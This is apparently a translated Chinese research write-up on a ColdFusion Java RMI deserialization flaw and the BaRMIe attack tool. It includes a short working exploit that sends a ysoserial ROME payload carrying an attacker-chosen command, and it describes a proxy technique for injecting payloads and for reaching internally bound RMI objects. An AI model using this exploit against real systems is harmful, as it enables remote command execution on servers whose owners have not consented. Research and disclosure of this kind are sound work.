        obj.count(null, new Object[] {
          new ROME().getObject(args[2])
        }, null);
      }
    }
    package nb.barmie.exploit.standalone;
    import coldfusion.flex.rmi.DataServicesCFProxy;
    import ysoserial.payloads.ROME;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class CFRMIExploit {
      public static void main(String[] args) throws Exception {
        Registry reg = LocateRegistry.getRegistry(args[0], Integer.parseInt(args[1]));
        DataServicesCFProxy obj = (DataServicesCFProxy)reg.lookup("cfassembler/default");
        obj.count(null, new Object[] {
          new ROME().getObject(args[2])
        }, null);
      }
    }
我们可以通过参数host、port和command来运行上述漏洞利用代码。
**基于BaRMIe的漏洞利用方法**
* * *
在RMI安全方面完成大量工作之后，我决定在自己的RMI枚举和攻击工具[BaRMIe](https://github.com/NickstaDB/BaRMIe
"BaRMIe")中实现这个反序列化漏洞的利用代码。虽然这样做的话，这个利用代码会更加复杂，但同时也会更强大。在不久的将来，我会发布这个版本的漏洞利用代码，但现在，不妨先来解释一下它的运行原理！
**关于RMI的背景知识**
* * *
我们知道，远程方法调用会涉及两个网络服务和两个不同的网络连接。第一个网络服务是RMI注册表服务，通常可以在TCP端口1099上找到，它实际上就是一个目录服务，用于将Java对象引用绑定到相应的名称上面。下面第4行的代码的作用，是连接到10.0.0.30:1099上的RMI注册表服务，并请求引用绑定名称为“Foo”的对象：
    public class RMIList {
      public static void main(String[] args) throws Exception {
        Registry reg = LocateRegistry.getRegistry("10.0.0.30", 1099);
        SomeClass obj = (SomeClass)reg.lookup("Foo");
      }
    }
    public class RMIList {
      public static void main(String[] args) throws Exception {
        Registry reg = LocateRegistry.getRegistry("10.0.0.30", 1099);
        SomeClass obj = (SomeClass)reg.lookup("Foo");
      }
    }
第二个网络服务用于与对象本身进行通信。当对象绑定到RMI注册表服务中的给定名称时，对象的主机和端口将存储在注册服务中（而知道了对象的主机和端口，就可以找到对象本身了）。从RMI注册表服务中检索对象引用时，RMI注册表服务返回的数据中将包括对象的网络服务的主机和端口。下面第5行代码的作用是连接到RMI对象服务并调用someMethod()方法：
    public class RMIList {
      public static void main(String[] args) throws Exception {
        Registry reg = LocateRegistry.getRegistry("10.0.0.30", 1099);
        SomeClass obj = (SomeClass)reg.lookup("Foo");
        obj.someMethod("String Param");
      }
    }
    public class RMIList {
      public static void main(String[] args) throws Exception {
        Registry reg = LocateRegistry.getRegistry("10.0.0.30", 1099);
        SomeClass obj = (SomeClass)reg.lookup("Foo");
        obj.someMethod("String Param");
      }
    }
**中间人攻击**
* * *
在构建BaRMIe时，我的目标是尽可能多地包含漏洞利用有效载荷（POP
gadget链），同时摆脱各种依赖项和单个依赖项的多个版本之类的纠葛。为了实现这一目标，我采用了硬编码静态有效载荷并按需生成动态部分（例如命令字符串和相应的长度字段）的方式。但是问题在于，没有办法将二进制字节注入到RMI连接上，以便让接收服务器对这些字节进行反序列化。为了实现这个目标，我建立了一个代理框架，以便在两个连接之间发动中间人攻击。它的工作原理如下所示：
  1. 启动一个将连接转发到目标RMI注册表的RMI注册表代理
  2. 调用LocateRegistry.getRegistry()，注意这里使用的是RMI注册表代理的主机和端口，而非RMI注册表服务的主机和端口
  3. 调用Registry.lookup()，通过RMI注册表代理（将请求转发给真正的RMI注册表服务）获取远程对象引用
  4. 当RMI注册表代理检测到返回的远程对象引用时：
  5. 它会启动一个RMI方法代理来将连接转发给实际的RMI对象服务
  6. 它会修改远程对象引用，使其指向新的RMI方法代理，而非实际的RMI对象服务
  7. 在远程对象引用上调用方法时，相应的连接将“路经”RMI方法代理 
既然远程方法调用是通过代理来完成的，那么自然就有机会完全控制该协议了，同时，原来Java虚拟机不许“碰”的一些东西，现在也可以尽情鼓捣了：一个很好的例子就是，如果一个远程方法预期的参数类型为java.lang.String，那么，就无法提供二进制形式的对象了，但是，如果使用代理在网络级别修改出站远程方法调用的话，就可以提供二进制形式的对象，并让服务器将对其进行反序列化处理了。
使用RMI方法代理时，可以通过常规方式使用占位符参数（而非有效载荷对象）来调用远程方法。当该方法代理检测占位符对象的字节时，我们可以用经过反序列化处理的有效载荷的字节流来替换这些占位符字节。
**修改有效载荷**
* * *
当我第一次在ColdFusion安装目录中发现文件“libs/rome-cf.jar”时，我做的第一件事就是利用BaRMIe创建了一个漏洞利用程序，让它利用RMI方法代理注入两个来自ysoserial的、基于ROME有效载荷的有效载荷。虽然这些努力并没有成功，但服务器的响应表明，问题在于本地类不兼容，并给出了服务器端类的serialVersionUID。本着不达目的不罢休的精神，我对自己的有效载荷进行了多次改进，最后终于使有效载荷中的serialVersionUID值与服务器上的值相匹配了，换句话说，又可以对ColdFusion发动远程命令执行攻击了。
**攻击“内部”服务**
* * *
也许读者会觉得上面介绍的代理技术非常复杂，但实际上，BaRMIe已经实现了相应的功能，因此，开发这个漏洞利用程序的时候，我只花了半小时就搞定了。
除了可以突破Java虚拟机的某些限制之外，本文介绍的代理方法还有一项额外的优势：控制某些服务。具体来说，就是许多所谓的“内部”RMI服务实际上并不是只对内使用的。您可以将对象绑定到RMI注册表，并给人这样的印象，即它们已经绑定到诸如127.0.0.1或10.0.0.30甚至host.yourbusiness.local上面。如果外部攻击者使用上面介绍的简单漏洞利用方法获得这些对象的引用后，实际上是无法攻击RMI服务的，因为他们无法访问这些内部地址。
但是，默认情况下，RMI对象服务将绑定到所有网络接口。假设目标的外部地址是8.8.8.9，RMI注册表会返回一个对象引用，该对象引用实际上指向目标的内部地址，即10.8.8.9:30001。默认情况下，也可以通过连接对象的外部地址上的相同端口，即8.8.8.9:30001来访问这个对象（内部地址为10.8.8.9:30001的那个对象）。通过代理RMI注册表连接，我们可以检测并自动修改RMI连接，从而对“内部绑定”的对象发起攻击。
**参考资料**
* * *
  * 我之前详细介绍ColdFusion安全漏洞的文章 ()
  * Adobe安全更新 APSB18-14 ()
  * Java反序列化漏洞利用 ()
  * ysoserial，Java反序列化有效载荷生成器 ()
  * ROME库 ()
  * BaRMIe ，RMI 枚举与攻击工具 ()